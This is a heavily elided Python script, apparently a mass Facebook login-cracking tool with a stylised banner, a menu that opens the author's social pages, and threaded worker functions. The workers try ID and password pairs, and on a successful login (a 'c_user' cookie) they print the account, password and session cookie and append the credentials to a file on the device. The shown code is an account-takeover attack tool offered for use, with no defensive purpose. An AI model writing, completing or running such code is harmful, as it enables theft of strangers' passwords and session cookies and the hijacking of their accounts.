...
from concurrent.futures import ThreadPoolExecutor as K3NG
...
╚═╝░░╚═╝╚═════╝░╚═╝░░╚══╝░╚═════╝░
  ...
  os.system('xdg-open https://www.facebook.com/profile.php?id=100090355101863')
...
def admin():
	...
	if bal =='2':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090355101863');time.sleep(1)

		admin()

	if bal =='3':

		os.system('xdg-open https://youtube.com/@pesmobileinsights');time.sleep(1)
...
def a(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [K3NG>OK] '+cid+' | '+ps+'\33[0;92m')

                print(f'\r\033[1;92m [♥] COOKIE : '+coki)

                open('/sdcard/K3NG-OK.txt', 'a').write(cid+' | '+ps+'\n')
     ...
     ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
...
def b(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/K3NG-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
